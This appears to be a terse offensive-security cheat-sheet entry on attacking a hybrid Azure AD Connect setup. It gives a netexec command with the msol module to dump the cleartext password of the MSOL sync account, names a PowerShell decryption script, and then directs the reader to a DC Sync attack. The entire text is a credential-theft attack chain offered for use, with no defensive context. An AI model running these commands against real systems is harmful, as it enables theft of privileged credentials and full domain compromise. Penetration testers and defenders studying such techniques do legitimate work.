# Hybrid Environment (Azure AD Connect)

## Tools: CrackMapExec/Netexec 

#### 1) Dump cleartext password of MSOL Account on AAD Connect server

    netexec smb IP -u USER -p PASSWORD -M msol

    azuread_decrypt_msol_v2.ps1

### After that, you may proceed to DC Sync
